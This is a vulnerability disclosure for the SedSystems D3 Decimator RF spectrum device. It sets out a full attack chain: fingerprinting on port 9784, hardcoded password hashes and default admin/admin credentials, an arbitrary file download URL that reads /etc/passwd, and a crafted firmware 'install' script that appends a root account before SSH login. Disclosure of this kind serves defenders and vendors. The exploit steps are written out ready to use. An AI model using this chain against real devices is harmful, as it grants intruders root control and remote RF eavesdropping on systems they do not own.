SedSystems D3 Decimator Multiple Vulnerabilities
================================================
Identification of the vulnerable device can be performed by scanning for
TCP port 9784 which offers a default remote API. When connected to this
device it will announce itself with "connected" or similar:

Connected to x.x.x.x.
Escape character is '^]'.
connected
status
status:3.1,3.0.12-1,0,0,41.0,Valid,Valid,540,-1.0,-1.0,5.1,11.4,-1.0
ping
ping:ok

The web service by default has a user interface for accessing the RF
spectrum analyzer capability. The device itself from the API can give
raw remote access to I/Q samples so can be used to remotely sniff the
RF spectrum. The Web Configuration Manager can be found on
"/cgi-bin/wcm.cgi". Multiple vulnerabilities exist.

Hardcoded credentials can be found in the /etc/passwd files contained
within the default firmware since at least February 2013. The following
entries can be found:

root:$1$zfy/fmyt$khz2yIyTFDoCkhxWw7eX8.:0:0:root:/:/bin/sh
admin:$1$$CoERg7ynjYLsj2j4glJ34.:1000:0:root:/:/bin/webonly

The admin user has a default password of "admin", at this time the root
user password is unknown however there is no documented way of changing
this trivially in a device. Using the "admin" user you can obtain a web
session to the wcm.cgi and exploit a hidden arbitary file download
vulnerability discovered by reverse engineering the firmware:

http://x.x.x.x/cgi-bin/wcm.cgi?sessionid=009d45ecbabe015babe3300f&download=true&fullfilename=/etc/passwd

This will allow you to download any file and as the "admin" user has root
privileges you can obtain access to any file on the device. To execute
arbitary code you can make use of a vulnerbaility within the firmware
flash routines. By uploading a crafted tarball that contains a "install"
script in its root, the device will accept your firmware and then attempt
to execute ./install if found as root, you can then cancel the "flash"
process to prevent bricking/modifcation of the device. The problem is due
to /usr/bin/install_flash which after using "tar" to unpack an archive
to a tmp folder of /tmp/PID_of_tar does the following:

    80  # If the archive contained its own install script then use that
    81
    82  if [ -x ./install ]; then
    83      ./install $all_args
    84      rc=$?
    85      exit $rc
    86  fi
    87

Using this vulnerability you can upload a .tar file containing an install
file that looks like the following to obtain a root user account with
adm1n/admin.

cat install
#!/bin/sh
echo adm1n:\$1\$\$CoERg7ynjYLsj2j4glJ34.:0:0:root:/:/bin/sh >> /etc/passwd

You can then SSH remotely to the device as PermitRootLogin is enabled
by default.

E.g.

$ ssh  -l adm1n x.x.x.x
adm1n@x.x.x.x's password: admin
